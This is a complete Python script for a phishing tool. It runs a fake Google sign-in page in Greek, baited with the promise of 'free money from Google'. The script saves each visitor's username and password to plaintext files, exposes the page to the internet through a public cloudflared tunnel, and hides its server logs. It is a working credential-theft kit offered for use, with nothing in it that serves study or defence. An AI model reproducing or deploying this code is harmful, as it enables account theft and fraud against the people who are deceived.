# Save this file as Google Free Money.py

import os
import sys
import subprocess
import re
import threading
import time
import logging
from flask import Flask, render_template_string, request, redirect, url_for
from datetime import datetime
from werkzeug.utils import secure_filename

# Auto-install missing packages quietly
def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

# Flask app setup
app = Flask(__name__)

# Suppress Flask and Werkzeug logs completely
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

# Also silence Flask's startup messages by redirecting output temporarily
class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

# Data saving folder
BASE_FOLDER = os.path.expanduser("~/storage/downloads/GoogleFreeMoney")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="el">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Δωρεάν Χρήματα από την Google - Διεκδικήστε την Ανταμοιβή Σας</title>
        <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
        <style>
            :root {
                /* Light theme colors */
                --bg-light: #ffffff;
                --text-light: #202124;
                --container-bg-light: #ffffff;
                --border-light: #dadce0;
                --input-bg-light: #ffffff;
                --input-border-light: #dadce0;
                --button-bg-light: #1a73e8;
                --button-hover-light: #1967d2;
                --link-light: #1a73e8;
            }

            @media (prefers-color-scheme: dark) {
                :root {
                    /* Dark theme colors */
                    --bg-light: #202124;
                    --text-light: #e8eaed;
                    --container-bg-light: #2c2c2c;
                    --border-light: #5f6368;
                    --input-bg-light: #3c4043;
                    --input-border-light: #5f6368;
                    --button-bg-light: #8ab4f8;
                    --button-hover-light: #a6c5f7;
                    --link-light: #8ab4f8;
                }
            }

            /* General Body Styles */
            body {
                font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
                background-color: var(--bg-light);
                color: var(--text-light);
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                margin: 0;
                padding: 20px;
                box-sizing: border-box;
                transition: background-color 0.3s, color 0.3s;
            }

            /* Main container for the form elements */
            .container {
                display: flex;
                flex-direction: column;
                align-items: center;
                width: 100%;
                max-width: 450px;
                padding: 48px 40px 36px;
                border: 1px solid var(--border-light);
                border-radius: 8px;
                box-sizing: border-box;
                text-align: center;
                background-color: var(--container-bg-light);
                transition: background-color 0.3s, border-color 0.3s;
            }

            /* Google-style text logo */
            .google-logo {
                font-family: 'Google Sans', sans-serif;
                font-size: 2.5em;
                font-weight: 400;
                margin-bottom: 24px;
            }
            .google-logo .g { color: #4285F4; }
            .google-logo .o1 { color: #EA4335; }
            .google-logo .o2 { color: #F9BC05; }
            .google-logo .g2 { color: #4285F4; }
            .google-logo .l { color: #34A853; }
            .google-logo .e { color: #EA4335; }

            /* Main heading */
            h1 {
                font-size: 1.5em;
                font-weight: 400;
                margin-bottom: 16px;
                line-height: 1.3333;
                transition: color 0.3s;
            }

            /* Input fields */
            .input-field {
                width: 100%;
                margin-bottom: 24px;
            }
            .input-field input {
                width: 100%;
                padding: 15px 14px;
                border: 1px solid var(--input-border-light);
                border-radius: 4px;
                background-color: var(--input-bg-light);
                font-size: 16px;
                box-sizing: border-box;
                color: var(--text-light);
                transition: background-color 0.3s, border-color 0.3s, color 0.3s;
            }
            .input-field input::placeholder {
                color: #80868b;
                opacity: 0.8;
            }
            .input-field input:focus {
                border-color: var(--button-bg-light);
                outline: none;
            }

            /* Buttons and links container */
            .actions-container {
                width: 100%;
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-top: 8px;
            }

            /* Link styles */
            .link-button {
                background: none;
                border: none;
                color: var(--link-light);
                font-size: 14px;
                font-weight: 500;
                cursor: pointer;
                padding: 8px 0;
                text-decoration: none;
                transition: color 0.3s;
            }
            .link-button:hover {
                text-decoration: underline;
            }

            /* Primary button */
            .primary-button {
                padding: 10px 24px;
                border: none;
                border-radius: 4px;
                background-color: var(--button-bg-light);
                color: white;
                font-size: 14px;
                font-weight: 500;
                cursor: pointer;
                transition: background-color 0.2s ease;
            }
            .primary-button:hover {
                background-color: var(--button-hover-light);
            }

            /* Footer text */
            .footer-text {
                font-size: 14px;
                color: #5f6368;
                margin-top: 24px;
                transition: color 0.3s;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="google-logo">
                <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
            </div>
            <h1>Σύνδεση</h1>
            <div class="footer-text">για να διεκδικήσετε την ανταμοιβή δωρεάν χρημάτων σας</div>

            <form action="/login" method="post" style="width: 100%; margin-top: 24px;">
                <div class="input-field">
                    <input type="text" name="username" placeholder="Email ή τηλέφωνο" required>
                </div>
                <div class="input-field">
                    <input type="password" name="password" placeholder="Κωδικός πρόσβασης" required>
                </div>
                <div class="actions-container">
                    <a href="#" class="link-button">Ξεχάσατε το email;</a>
                    <button type="submit" class="primary-button">Σύνδεση</button>
                </div>
            </form>

            <a href="#" class="link-button" style="margin-top: 36px;">Δημιουργία λογαριασμού</a>
        </div>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()

    if not username or not password:
        return "Email/Τηλέφωνο και κωδικός πρόσβασης απαιτούνται!", 400

    safe_username = secure_filename(username)
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Όνομα χρήστη: {username}\n")
        file.write(f"Κωδικός πρόσβασης: {password}\n")
        file.write(f"Χρονική σήμανση: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="el">
    <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <meta name="color-scheme" content="light dark" />
      <title>Η Ανταμοιβή Διεκδικήθηκε!</title>
      <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet" />
      <style>
        :root {
          --primary-success: #28a745;
          --bg-light: #ffffff;
          --text-light: #202124;
          --container-bg-light: #ffffff;
          --shadow-light: rgba(0,0,0,0.1);
        }
        @media (prefers-color-scheme: dark) {
          :root {
            --primary-success: #28a745;
            --bg-light: #202124;
            --text-light: #e8eaed;
            --container-bg-light: #2c2c2c;
            --shadow-light: rgba(0,0,0,0.3);
          }
        }
        body {
          font-family: 'Roboto', sans-serif;
          margin:0; padding:20px;
          display:flex; justify-content:center;
          min-height: 100vh;
          align-items: center;
          background-color: var(--bg-light);
          color: var(--text-light);
          transition: background-color 0.3s, color 0.3s;
        }
        .container {
          padding: 40px;
          max-width: 600px;
          width: 100%;
          border-radius: 8px;
          box-sizing: border-box;
          text-align: center;
          background: var(--container-bg-light);
          border-left: 4px solid var(--primary-success);
          box-shadow: 0 4px 20px var(--shadow-light);
          transition: background-color 0.3s, border-color 0.3s, box-shadow 0.3s;
        }
        h2 {
          margin-top: 0;
          font-weight: 700;
          font-size: 1.8em;
          margin-bottom: 10px;
          color: var(--primary-success);
          transition: color 0.3s;
        }
        p {
          font-size: 1.1em;
          margin-top: 20px;
          line-height: 1.4;
        }
      </style>
      <meta http-equiv="refresh" content="3; url=/" />
    </head>
    <body>
      <div class="container">
        <h2>Η Ανταμοιβή Διεκδικήθηκε!</h2>
        <p>Η διεκδίκησή σας έχει υποβληθεί σε επεξεργασία.<br>Θα ανακατευθυνθείτε σε λίγο.</p>
      </div>
    </body>
    </html>
    '''
    )

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--protocol", "http2", "--url", local_url]

    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    tunnel_url = None
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"Δημόσια Σύνδεση Δωρεάν Χρημάτων Google: {tunnel_url}")
            sys.stdout.flush()
            break
    return process

if __name__ == '__main__':
    # Suppress Flask startup messages by redirecting stdout/stderr temporarily
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    # Run flask app in a separate thread so we can run cloudflared tunnel simultaneously
    def run_flask():
        app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    # Restore stdout/stderr after server starts
    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5000")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        sys.exit(0)